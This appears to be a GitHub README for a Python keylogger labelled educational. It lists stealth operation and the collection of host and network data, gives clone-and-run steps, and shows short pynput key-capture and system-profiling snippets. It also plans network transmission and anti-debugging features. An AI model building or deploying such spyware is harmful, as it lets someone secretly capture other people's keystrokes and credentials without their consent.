# Python Keylogger 

**A Python-based keylogger implementation demonstrating keyboard monitoring and system information collection. For educational/research purposes only.**

⚠️ **Important Legal Disclaimer** ⚠️  
This project is intended **strictly for educational purposes**. Unauthorized use to monitor devices without explicit permission is illegal. Developers assume no liability for misuse.

## Features
- **Keystroke Logging**: Records keyboard inputs with timestamps
- **System Metadata Capture**: Collects hostname, IP addresses, and hardware specs
- **Special Key Handling**: Detects Enter/Space/Backspace
- **Stealth Operation**: Runs with minimal system visibility
- **Cross-Platform**: Compatible with Windows, macOS, and Linux
- **Error Resilience**: Robust exception handling

## Project Structure
- `keylogger.py`: Core logging implementation
- **Modules**:
  - **System Profiler**: Hardware/network data collection
  - **Key Listener**: Keyboard input monitoring
  - **Log Manager**: Secure data storage handling

## Prerequisites
- Python 3.6+
- Administrative privileges (recommended)
- Network connection (for public IP detection)

## Installation & Usage
1. **Clone repository**:
```bash
git clone https://github.com/sabihhuda/Keylogger-Phyton.git
cd python-keylogger
```

2. **Install dependencies**:
```bash
pip install pynput requests
```

3. **Run keylogger**:
```bash
python keylogger.py
```

Logs will be saved to `key_log.txt` in the project directory.

## Configuration
Customize in `keylogger.py`:
```python
# Change log location
LOG_DIRECTORY = "/path/to/custom/folder/"

# Modify logging format
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%b-%Y %H:%M:%S"
)
```

## Code Snippets
### 1. System Information Collection
```python
def collect_system_info():
    """Gather device metadata"""
    hostname = socket.gethostname()
    logging.info(f"OS Version: {platform.system()} {platform.release()}")
    logging.info(f"Architecture: {platform.machine()}")
```

### 2. Key Press Handler
```python
def on_key_press(key):
    """Process keyboard input"""
    try:
        if key == Key.space:
            logging.info("[SPACE]")
        elif key == Key.enter:
            logging.info("[ENTER]")
        else:
            logging.info(str(key).replace("'", ""))
    except Exception as e:
        logging.error(f"Key processing error: {str(e)}")
```

## Ethical Guidelines
- 🛑 **Legal Compliance**: Always obtain written consent before testing
- 🔐 **Data Security**: Treat logs as sensitive information
- ⚠️ **Responsible Disclosure**: Never deploy on unauthorized systems
- 🧹 **Cleanup**: Remove all logs after educational use

## Future Enhancements
- GUI configuration panel
- Log file encryption
- Network transmission module
- Anti-debugging techniques
- Usage time limitations

## License
MIT License - See [LICENSE](LICENSE) for details

## Contact
For educational inquiries: sabihhuda3@gmail.com  
**Note:** This project is not maintained for production use - created purely for academic demonstration.
```

